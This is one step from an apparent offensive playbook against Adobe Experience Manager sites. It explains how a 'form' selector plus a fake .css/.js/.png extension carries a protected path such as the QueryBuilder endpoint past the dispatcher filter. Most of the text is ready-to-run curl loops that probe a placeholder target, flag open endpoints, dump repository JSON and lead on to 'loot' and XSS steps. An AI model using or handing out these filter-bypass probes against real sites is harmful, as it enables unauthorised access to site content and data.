# Batch 06 — Trick the bouncer (`form` + secret path after)

## GOAL
Use `.form.css/` (or `.js`/`.png`) so the **real path rides after** as a suffix.

## TIME
~1 hour

## YOU NEED
- `PAGE` from batch 01

---

## WHY (30 seconds)

AEM URLs can be:

```text
/normal/page.form.css/REAL/PATH/HERE
         \selector/ \ext/ \___suffix___/
```

Guard looks at the front: “page + css, fine.”  
App may treat the **suffix** as the real place to go (e.g. QueryBuilder).  
That is a built-in “cheat code” selector named `form` (often patched — still try).

---

## DO THIS

```bash
T="https://PUT-THE-SITE-HERE"
PAGE="/content/YOUR/PAGE"
```

### 1) QueryBuilder via suffix

```bash
for ext in css js png html; do
  u="${PAGE}.form.${ext}/bin/querybuilder.json?path=/content&p.limit=3"
  code=$(curl -sk -o /tmp/qb.out -w "%{http_code}" "$T$u")
  echo "$code  $u"
  grep -qE 'hits|success' /tmp/qb.out && echo ">>> OPEN" && head -c 200 /tmp/qb.out && echo
done
```

### 2) Also try DAM root

```bash
curl -sk -o /tmp/qb.out -w "%{http_code} bytes=%{size_download}\n" \
  "$T/content/dam.form.js/bin/querybuilder.json?path=/&p.limit=3"
head -c 300 /tmp/qb.out; echo
```

### 3) Dump JSON via suffix

```bash
curl -sk -o /tmp/n.json -w "%{http_code} bytes=%{size_download}\n" \
  "$T${PAGE}.form.png/content.3.json"
head -c 250 /tmp/n.json; echo
```

---

## IF / THEN

| What you saw | What you do |
|--------------|-------------|
| OPEN / hits / fat JSON | Save URL → **07** |
| All dead after 04+05+06 | Skip loot door for now → **09** (XSS track) |
| Forms=yes from 01 | After 09–11 or next day → **12** |

---

## NEXT
- Win → [07-loot-querybuilder.md](./07-loot-querybuilder.md)  
- No data door → [09-xss-rawcontent.md](./09-xss-rawcontent.md)
